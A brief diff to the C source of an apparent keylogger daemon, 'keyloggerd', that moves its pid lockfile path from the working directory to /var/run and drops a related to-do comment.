@@ -11,8 +11,7 @@
 #include "lockfile.h"
 #include "logger.h"
 
-/* @todo set to /var/run/keyloggerd.pid when super user support is added */
-#define LOCKFILE "keyloggerd.pid"
+#define LOCKFILE "/var/run/keyloggerd.pid"
 
 /**
  * Daemonize the process
